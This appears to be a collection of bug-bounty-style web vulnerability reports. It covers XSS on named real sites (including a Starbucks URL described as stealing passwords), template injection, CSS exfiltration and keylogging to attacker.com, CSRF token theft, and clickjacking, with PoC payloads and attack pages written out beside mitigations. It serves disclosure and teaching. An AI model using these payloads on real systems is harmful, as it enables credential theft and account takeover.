Vulnerability Report – Cross-Site Scripting (XSS)
Vulnerability: Cross-Site Scripting (XSS)
Type: Reflected XSS (Path Injection)
-----------------------------------------------------------------------------------------------------------------------------------------------------------
Found in:


Login Page URL Path:

   -https://www.starbucks.com/account/signin
   -https://www.starbucks.co.uk/account/signin

Description:
  A Cross-Site Scripting vulnerability exists due to improper escaping of user-controlled URL path segments. The login page dynamically generates links using relative paths, allowing an           attacker to inject special characters and break out of HTML attributes, leading to JavaScript execution.

This occurs because the application does not sanitize or encode characters like quotes within the URL path.

Steps to Reproduce:

step 1 : Open Chrome or Firefox.

step 2 : Visit the following malicious URL:

https://www.starbucks.com/account/(A("%20%252fonmouseover=%22alert%25%32%38%64%6f%63%75%6d%65%6e%74.%64%6f%6d%61%69%6e%25%32%39%22"))/signin

step 3 : Move the mouse over the "Find the Store" button.

step 4 : An alert will trigger, confirming JavaScript execution.

PoC (Credential Theft Example):
https://www.starbucks.com/account/(F("%20%252fonmouseover=%22%2561%256c%2565%2572%2574%2528%2564%256f%2563%2575%256d%2565%256e%2574%252e%2567%2565%2574%2545%256c%2565%256d%2565%256e%2574%2573%2542%2579%254e%2561%256d%2565%2528%2527%2541%2563%2563%256f%2575%256e%2574%252e%2550%2561%2573%2573%2557%256f%2572%2564%2527%2529%255b%2530%255d%252e%2576%2561%256c%2575%2565%2529%22"))/signin

Impact:
1)JavaScript execution in the context of starbucks.com.
2)Possible credential theft on the login page.
3)Account compromise through stolen passwords.
4)Products & Versions Affected

Mitigations:

1)Properly escape and encode all user-controlled URL path segments.
2)Validate and sanitize characters before rendering paths.
3)Avoid constructing links using unsanitized relative paths.



Vulnerability Report – Reflected Cross-Site Scripting (XSS)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Vulnerability: Cross-Site Scripting (XSS)
Type: Reflected XSS
Found in:

 • https://www.hackerone.com/resources/

 • https://resources.hackerone.com/

Description:
   A reflected Cross-Site Scripting vulnerability exists due to improper sanitization of user-controlled parameters within the embed_mini resource loading endpoint. The parameter miniUrl is not safely encoded, allowing an attacker to inject HTML/JavaScript content and execute arbitrary code when the page renders the crafted URL.

The issue occurs when the application places user input directly into the page without escaping special characters, enabling the injection of script tags or SVG-based payloads.

Steps to Reproduce:

• Open any browser (Chrome or Firefox).

• Visit the following proof-of-concept URL:

• https://www.hackerone.com/resources/read/embed_mini/11690/122736?miniPop=false&alwaysCover=false&miniTitle=XSS+POC&miniColor=333333&miniLinkToTitle=true&miniUrl=http://example.com%22%22,})%3C/script%3E%3Csvg+onload=confirm(location)%3E&miniBg=FFFFFF&hideBg=true&width=380&height=330&sharing=true

Impact:
• Arbitrary JavaScript execution on HackerOne’s resource pages.
• Possible redirection, phishing, session manipulation, or stealing sensitive data rendered in the page context.
• Products & Versions Affected:
    • www.hackerone.com/resources
    • resources.hackerone.com



Mitigations:
•Apply proper HTML escaping/encoding on all user-controlled parameters.
•Strictly validate and sanitize URL parameters such as miniUrl.
• Disable rendering of untrusted input inside HTML context.
• Implement a strict Content Security Policy (CSP) to limit script execution.

Vulnerability: Cross-Site Scripting (XSS)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Type: Stored XSS
Found in:https://app.mopub.com/reports/custom/

• Description:Stored XSS occurs when a malicious script is permanently stored on the server (e.g., in a database, reports, comments). Whenever a user loads the affected page, the script automatically executes.
In this case, the “Report Name” field on MoPub’s custom reports page fails to sanitize input, allowing attackers to store malicious HTML/JS that executes whenever anyone opens the saved report.

Steps to Reproduce:

• Visit:https://app.mopub.com/reports/custom/
• Click “New Network Report”.
       In the Name field, enter the payload:
       "><img src=x onerror=alert(document.domain)>
•Click Run and Save.
• Open the saved report — the payload executes automatically.
•PoC Payload:
    "><img src=x onerror=alert(document.domain)>

Tested on: Chrome & Firefox.

• Impact: Anyone who opens the stored report triggers the attacker's script.
This can allow:
    •Credential theft
    •Session hijacking
    • Access to sensitive reports
    •Redirects and phishing attacks
• Products & Versions Affected:
    MoPub Dashboard
    Custom Reports Feature

• Mitigations:
   Escape user input before rendering.
   Sanitize HTML tags and JavaScript event handlers.
   Implement strict Content Security Policy (CSP).
   Use allowlists for input fields like report names.

DOM-BASED CROSS-SITE SCRIPTING (DOM XSS) REPORT
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Vulnerability: Cross-Site Scripting (XSS)
Type: DOM-Based XSS
Found in:https://kb.informatica.com/KBExternal/pages/infasearchltd.aspx

• Description:

• DOM-based XSS occurs when JavaScript on the client-side processes user input in an unsafe manner, causing malicious input from the URL to be executed directly in the DOM.
The page dynamically creates elements using unsafe concatenation of document.URL into HTML without sanitization.

• Vulnerable Code (From view-source):
  var li = document.createElement("li");
  strChild = "<a href="+document.URL+" style='color:#fff !important;font-size:10px'>Search Results</a>";
  li.innerHTML = strChild;
  document.getElementById('DynamicBreadcrumb').appendChild(li);

Because document.URL is directly injected into innerHTML, attackers can inject HTML/JS through the URL hash #.

• Steps to Reproduce (PoC URLs):
   Google Chrome PoC:
    https://kb.informatica.com/KBExternal/pages/infasearchltd.aspx?#"><img src=x onerror=alert(document.domain)>&infasearch.aspx=hek

• Internet Explorer 11 PoC:https://kb.informatica.com/KBExternal/pages/infasearchltd.aspx?#"><img src=x onerror=alert(document.domain)>&infasearch.aspx=hek

    When loaded, the onerror event fires, executing JavaScript.
Impact:
    JavaScript execution in the context of kb.informatica.com
    Possible theft of personal data stored in the portal
    Account takeover (if session tokens accessible)
    Redirects to malicious sites

Mitigations:
    Sanitize document.URL before inserting into DOM.
    Never use .innerHTML with user-controlled data.
    Use .textContent or safe templating libraries.

Vulnerability: Cross-Site Scripting (XSS)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Type: Self XSS
Found in:https://accounts.shopify.com/password-reset/new

• Description:Self-XSS occurs when an application reflects or renders HTML/JavaScript entered by the user into an input field. Although the payload requires the victim to execute it themselves, Self-XSS still indicates improper input sanitization and unsafe rendering of user-controlled data.

On Shopify’s password-reset page, the email input field renders user-supplied HTML styling in the page, proving HTML is not properly escaped.

---> Steps to Reproduce:

    • Visit:https://accounts.shopify.com/password-reset/new
        In the Email Address input field, enter the following HTML:
        <h1 style="color:blue;">█████</h1>
      Submit or click outside the field.
The text is rendered with blue color — proving HTML injection.
    • PoC Payload:
        <h1 style="color:blue;">█████</h1>
Impact:

While this does not directly allow remote exploitation, it demonstrates poor filtering that could potentially lead to more severe vulnerabilities if combined with another flaw.
Possible risks:
    • UI manipulation
    • User tricking (phishing-style via injected forms)
    • Potential upgrade to Stored or Reflected XSS if reflected back elsewhere
Products & Versions Affected:
    • Shopify Accounts Portal
    • Password Reset Page

Mitigations:
    • Escape all HTML characters in user inputs (<, >, ", ').
    • Use server-side and client-side sanitization.
    • Render user input using .textContent, not .innerHTML.

Vulnerability: Content Security Policy Bypass
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Type: CSRF Token Exfiltration via data-method POST Handler
Found in: HackerOne platform — HTML injection inside reports

• Description: HackerOne uses a strict CSP to prevent execution of inline JavaScript. However, an attacker who manages to inject arbitrary HTML into a report can exploit a built-in JavaScript click-handler that processes <a data-method="post"> links.

•This handler automatically sends a POST request with the victim’s authenticity_token, even to an external domain.
•This bypasses CSP because:
•No JavaScript injection is needed
•Only HTML is required

----> Steps to Reproduce:
      Note: Actual injection is simulated via console in the original report due to lack of direct HTML injection at the time.
      •Suppose attacker injects this HTML into a report:
            <a href="http://danlec.com" data-method="post">Proof of Concept</a>
      • When a victim views the report and clicks the link, HackerOne’s JavaScript automatically sends a POST request to danlec.com including:
         authenticity_token
         Cookie data allowed by browser
         Additional security headers
         Attacker now receives the CSRF token at their server.
         Using this stolen token, attacker can craft a malicious POST request such as:
         https://hackerone.com/danlec-test/team_members
         to add themselves as a team member or perform other authenticated actions.

----> PoC (Simulated via Console):
              $(".hacktivity-container-content:first")
                .html('<p><a href="http://danlec.com" data-method="post">Click Me!</a></p>')
      Victim clicks the link → Token is exfiltrated.

Impact:

•Theft of CSRF authenticity token
•Unauthorized account actions
•Adding attacker as team manager
•Privilege escalation
•Full account takeover depending on workflow
•This is effectively a CSP bypass + CSRF bypass even without JavaScript injection.

Mitigations:
•Restrict data-method click handler to same-origin URLs only.
•Validate HTML inserted into report fields; use sanitization.
•Strengthen CSP rules to disallow automatic POSTs to external origins.
•Require user confirmation dialogs before executing data-method="post" actions.

Vue Template Injection
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Vulnerability: Vue Template Injection
Type: Client-Side Template Injection → XSS
Found in: Any parameter rendered inside Vue template bindings (e.g., {{ }}, v-bind, v-html).
• Description: Vue.js automatically evaluates template expressions ({{expression}}).
If user-controlled input is embedded inside Vue templates without sanitization, an attacker can inject a malicious Vue expression that leads to JavaScript execution.
This results in client-side template injection, which escalates to XSS.

---->Steps to Reproduce:
          • Navigate to the vulnerable page where user input is reflected inside a Vue expression.
          • Inject the following payload into any input parameter:
                            {{constructor.constructor('alert(1)')()}}
          • The page will execute the payload and trigger JS execution.
PoC
 Payload:
    {{this.constructor.constructor('alert(1)')()}}

---->Impact:
    • Full client-side JavaScript execution
    • Session hijacking
    • Account takeover
    • Defacement
    • Stealing CSRF tokens or localStorage
    • Products & Versions Affected:
    • Any Vue.js application that reflects unsanitized user input into template expressions.

-----> Mitigations:
    • Never interpolate user input inside Vue templates.
    • Use v-text instead of {{ }} if rendering user content.
    • Disable template parsing or use v-once / v-pre.
    • Escape { and } in user-controlled content.
    • Use security libraries like DOMPurify for HTML sanitization.

React JSX Injection
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Vulnerability: React JSX Injection
Type: Client-Side Template Injection → XSS
Found in: React components rendering user input into JSX attributes or dangerouslySetInnerHTML.

---->Description: React normally protects against XSS, but if developers use:
    •dangerouslySetInnerHTML
    •Unescaped user input inside JSX props
    •Unsafe dynamic components
    Attackers can inject malicious JS or manipulate component logic to execute code.
    This becomes JSX Injection → XSS.

---->Steps to Reproduce:
    •Find a React page where input is rendered using dangerouslySetInnerHTML.
    •Inject the payload:
            <img src=x onerror=alert(1)>
    •The browser will execute the JavaScript.
---->PoC:
        Payload:"><svg/onload=alert(1)> 
        If React improperly handles attribute injection, the script executes.

---->Impact:
        •Full client-side JavaScript execution
        •Cookie/session theft
        •Complete account takeover
        •Defacing UI components

----->Mitigations:
        •Avoid dangerouslySetInnerHTML unless absolutely required.
        •Sanitize HTML using DOMPurify before inserting.
        •Use React's default escaping everywhere else.

Handlebars Client-Side Template Injection
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Vulnerability: Handlebars Template Injection
Type: Client-Side Template Injection (CSTI) → XSS
Found in: Templates compiled in the browser, using unsanitized input inside {{ }}.

----->Description:  Handlebars allows helpers and expression evaluation.
 If user input becomes part of a Handlebars template before compilation, attackers can inject malicious helpers and escape templates to execute JavaScript.

----->Steps to Reproduce
     • Find any input that is compiled client-side using Handlebars.
     • Inject the payload:
           {{#with (lookup this "constructor")}}
                 {{lookup (lookup this "constructor") "constructor"}}("alert(1)")()
           {{/with}}
     The template compiles and executes JS.

----->PoC
        Payload:
          {{constructor.constructor('alert(1)')()}}

------>Impact: 
       • Browser-level code execution
       •Ability to steal session tokens
       •CSRF bypass
       •Full account compromise

------->Mitigations:
       •Never compile templates in the browser using user input.
       •Precompile templates server-side.
       •Disable Handlebars dangerous helpers.
       •Escape all dynamic values before passing to templates.

Vulnerability: Mustache Template Injection
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Type: Client-Side Template Injection → Potential XSS
Found in: {{ }} or {{{ }}} interpolation blocks.

----->Description:Mustache is logic-less, so attacks are limited compared to Handlebars.
But if the developer enables unescaped tags ({{{ }}}), user input can break HTML context and lead to script injection.

----->Steps to Reproduce:
    • Find a Mustache template where user input is inserted using:
           {{{ user_input }}}


------>Inject payload:
      <img src=x onerror=alert(1)>
        Script executes in browser.

------->PoC

        Payload:
             {{{ "<svg/onload=alert(1)>" }}}
------->Impact:
       • Stored or reflected XSS
       • Cookie stealing
       • Account takeover
       • Redirects to malicious websites
       • Products & Versions Affected:
       • Any client-side Mustache.js implementation allowing unescaped rendering.

-------->Mitigations:
       • Avoid triple braces ({{{ }}}) for user input.
       • Enforce escaping on all dynamic fields.
       • Sanitize HTML with DOMPurify.
       • Perform strict HTML filtering on inputs.

Vulnerability: CSS Data Exfiltration
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Type: CSS Injection → Sensitive Data Leakage
Found in: example.com/profile — “Full Name” and “Address” fields reflected into inline CSS without sanitization.

Description:If an attacker can inject malicious CSS rules, they can force the browser to make external requests based on user-controlled data.
CSS supports url() and attribute selectors, which can be abused to leak sensitive information via remote servers.

In this case, example.com embeds user profile information inside style blocks:
     <style>
           .userName::before { content: "Lavish"; }
     </style>   
     An attacker can manipulate this to exfiltrate data using crafted CSS.

---->Steps to Reproduce:
    • Go to : https://example.com/profile?name=<payload>
    • Inject : body{background:url(https://attacker.com/log?data=USERNAME_HERE)}
    • The browser sends a request to attacker.com, leaking data.
    • More advanced exfiltration:
        input[value^="A"]{background:url(https://attacker.com/A);}
        input[value^="B"]{background:url(https://attacker.com/B);}

---->PoC Payload:
       </style>
          input[value^="L"]{background:url(https://attacker.com/L);}
       <style>

---->Impact:
       • Leakage of sensitive user profile data
       • Possible theft of email, address, username
       • Exfiltration of hidden values such as CSRF tokens
       • Tracking users across pages
       • Can escalate to account takeover if tokens leak
       • Products & Versions Affected:
       • example.com Web Portal (latest version)

----->Mitigations: • Strip <style> tags from all user input
                   • Disallow special CSS characters ({, }, :, [, ])
                   • Implement CSP restricting external stylesheets

Vulnerability: CSS Keylogging
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Type: CSS Injection → Input Value Leakage
Found in: example.com/login — username field style attribute is controlled by user input.

----->Description: CSS can be used to “keylog” characters typed into input fields using attribute selectors like:
                   input[value^="a"] { background:url(https://attacker.com/a); }
                   Each time the user types a character, the browser loads an image with that character encoded in the URL.
                   On example.com, the login page applies dynamic CSS from user-controlled parameters.
                   This allows an attacker to observe typing behavior.

----->Steps to Reproduce:
           •Navigate to : https://example.com/login?theme=<payload>
           • Inject CSS:
                 input[name="username"][value^="a"]{
                         background:url(https://attacker.com/a);
                       }
                 input[name="username"][value^="b"]{
                         background:url(https://attacker.com/b);
                       }

           • When the victim types a, the browser sends a request to:
                 https://attacker.com/a
           • By defining 26 selectors, attacker can keylog each keystroke.

------>PoC Payload:   </style>
                           input[value$="1"]{background:url(https://attacker.com/1);}
                      <style>

------>Impact: 
       • Leakage of every keystroke
       • Theft of usernames, email addresses
       • Possible leakage of partial passwords
       • Tracking user behavior without JavaScript
       • Works even with strict CSP that blocks scripts
     
------->Mitigations:
       • Never allow user-controlled CSS
       • Block injection of <style> or style= attributes
       • Filter characters ({, }, [, ], :)
       • Enforce a strict CSP disallowing inline styles
       • Do not reflect input attributes without escaping

Vulnerability: CSS Selector Leakage
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Type: CSS Injection → Exfiltration of Private Information
Found in: example.com/dashboard — reflected user role inside CSS class names.

------->Description : CSS selectors can be abused to leak private information by testing for the existence of HTML elements or user-specific classes.
                      If a victim’s page contains:
                             <div class="role-admin"></div>
                      An attacker can test for this using CSS:
                      .role-admin { background:url(https://attacker.com/admin); }
                      .role-user  { background:url(https://attacker.com/user); }
------->Steps to Reproduce:
         • Visit: https://example.com/dashboard?style=<payload>
         • Inject CSS that probes for classes:
                  .role-admin{background:url(https://attacker.com/admin);}
                  .role-moderator{backgr\ound:url(https://attacker.com/mod);}
                  .role-user{background:url(https://attacker.com/user);}
         • Observe which URL the browser loads → user’s role leaks.
           The same method can leak:
               •feature flags
               •subscription level
               •unread messages
               •notification counts
               •dark/light mode preferences

------->PoC Payload:
             </style>
                    .role-premium{background:url(https://attacker.com/premium);}
             <style>

------->Impact:
             • Sensitive metadata leakage
             • User privilege disclosure (admin/user/mod)
             • Subscription level disclosure
             • Helps attackers plan targeted attacks
             • Can aid privilege escalation or phishing

------->Mitigations:
             • Do not reflect user-controlled values into class names
             • Block injection of CSS rules
             • Sanitize all template variables before inserting into <style>

Vulnerability: Classic Clickjacking
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Type: UI Redressing
Found in: example.com/settings — no X-Frame-Options or CSP frame-ancestors header.
-------->Description:Classic Clickjacking occurs when a website can be embedded inside an attacker-controlled iframe.
                     The attacker overlays invisible or disguised elements, tricking the victim into clicking sensitive buttons.
                     example.com/settings loads inside an iframe without any framing protection, allowing a malicious site to perform unauthorized actions such as:
                     Changing account email
                     Enabling 2FA bypass
                     Deleting account
                     Triggering purchases

-------->Steps to Reproduce:
                    • Host the following PoC on attacker.com:
                           <!DOCTYPE html>
                           <html>
                           <body>
                           <h1>Win a Free Gift! Click Below</h1>
                           <iframe src="https://example.com/settings"
                                   style="opacity:0.01; width:1000px; height:1000px; position:absolute; top:0; left:0;">
                           </iframe>
                           <button style="z-index:9999; position:absolute; top:200px; left:200px; height:100px; width:200px;">
                           Click Here to Claim Prize
                           </button>
                           </body>
                           </html>

• When the victim clicks the visible button, they actually press a hidden button on example.com/settings.
• Actions may include changing email, submitting forms, or modifying account preferences.

------->Impact:
              • Full account takeover (if clicking “Change Email”)
              • Unauthorized configuration changes
              • Forced purchases
              • Enabling/disabling security settings
              • Tricking users into performing dangerous actions

Mitigation:
              • Add one of the following security headers:
                  X-Frame-Options: DENY 
                          or
                  X-Frame-Options: SAMEORIGIN

Vulnerability: Likejacking
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Type: Social Media Clickjacking
Found in: example.com/blog/*

------> Description - Likejacking is a specialized version of clickjacking where the attacker tricks the victim into clicking a hidden social media "Like", Follow, or Share button.
                      On example.com, blog pages embed a Facebook "Like" widget:
                      <iframe src="https://www.facebook.com/plugins/like.php?href=example.com/blog/post1"></iframe>
                      Since framing protections are not implemented, an attacker can overlay this invisible widget on top of any clickable area.
------> Steps to Reproduce:
                      •  Host the following PoC:
                          <html>
                          <body>
                          <h1>Click to Download Free Wallpaper</h1>
                          <iframe 
                              src="https://www.facebook.com/plugins/like.php?href=https://example.com/blog/123"
                              style="opacity:0.001; width:350px; height:80px; position:absolute; top:100px; left:100px;">
                          </iframe>
                          <button style="z-index:9999; position:absolute; top:100px; left:100px; width:350px; height:80px;"> Download Now</button>
                          </body>
                          </html>
                      • The victim thinks they are clicking the button, but they are actually clicking the Like button.

------> Impact: 
            • Victim unknowingly “likes” specific posts
            • Artificial boosting of posts on social platforms
            • Used in political manipulation, scams, phishing
            • Damages user trust in example.com
            • Can be combined with malware distribution
------> Mitigation
            • Add X-Frame-Options: DENY or CSP frame-ancestors 'self'
            • Avoid embedding social buttons via iframe
            • Replace them with static links or server-side share endpoints

Cursorjacking
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Vulnerability: Cursorjacking
Type: UI Redressing / Pointer Manipulation
Found in: example.com/account/delete

--------> Description: Cursorjacking tricks the victim into thinking the mouse cursor is at a different location than where it actually is.
                       This is typically done through:
                       • CSS cursor manipulation
                       • Absolute-position overlays
                       • Transparent layers shifting mouse hitboxes
                       • Custom cursor images misleading the user
                         example.com allows custom CSS themes through a URL parameter (?theme=), which can be manipulated to replace the user's cursor and shift clickable elements.
--------> Steps to Reproduce:
                       • Visit attacker page:
                         <html>
                         <body>
                         <h1>Click the Square to Play</h1>
                         <style>
                         iframe {
                                 position:absolute;
                                 top:0;
                                 left:0;
                                 width:800px;
                                 height:800px;
                                 opacity:0.01;
                                 cursor:url('https://attacker.com/fake-cursor.png'), auto;
                                 }
                         </style>
                                  <iframe src="https://example.com/account/delete"></iframe>
                                  <div style="width:100px;height:100px;background:red;position:absolute;top:100px;left:100px;"></div>
                         </body>
                         </html>
                         • The victim sees a fake cursor far away from the real click point.
                         • When they try to click the red box, the click lands on the hidden “Delete Account” button of the iframe.
-----> Impact:
             • Account deletion
             • Unauthorized purchases
             • Forced subscription upgrades
             • Modification of settings
             • Victim can be tricked into clicking any sensitive UI element
             • Cursorjacking is more dangerous than normal clickjacking because the victim believes they clicked on the intended target.

-----> Mitigation:
             • Block framing entirely:
             • Content-Security-Policy: frame-ancestors 'self'; 
             • X-Frame-Options: DENY;

Drag & Drop Hijacking
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
---->Summary - An attacker can hijack a user session by tricking the victim into performing a Self-XSS via the drag-and-drop feature in the chat.
---->Description: When a malicious payload is dragged and dropped into the chat box, Self-XSS gets executed. This allows the attacker to capture the victim’s Meteor.loginToken and take                                      o                 over their session.

----> Releases Affected:
           •3.5.2
           •3.5.3 (tested)

---->Steps to Reproduce:
           •Host the malicious image using Python HTTP server.
           •Trick the user into dragging and dropping it into chat.
           •Extract Meteor.loginToken from server logs.
           •Open Rocket.Chat and insert token into local storage.
           •The attacker is automatically logged into the victim’s session.

----->Impact:
           •Full session takeover
           •Ability to read chats
           •Modify limited profile info
           •Lock the victim out via 2FA
           •Possible configuration changes if the victim is an admin

------>Mitigation:
           •Sanitize drag-and-drop input
           •Strip HTML/script tags

           •Block Self-XSS payload execution on client side

